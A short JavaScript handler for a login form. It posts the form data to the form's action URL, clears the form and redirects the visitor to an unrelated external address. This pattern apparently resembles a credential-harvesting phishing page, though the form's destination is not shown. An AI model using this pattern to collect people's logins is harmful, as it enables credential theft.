const form = document.getElementById("loginForm");

async function handleSubmit(event) {
  event.preventDefault();
  const data = new FormData(event.target);

  fetch(form.action, {
    method: "POST",
    body: data,
    headers: {
      'Accept': 'application/json'
    }
  }).then(response => {
    form.reset()
    window.location.assign("https://mooney.it/aasasaas")
  }).catch(error => {
    statusResult.innerHTML = "Oops! There was a problem submitting your form"
  });
}

form.addEventListener("submit", handleSubmit)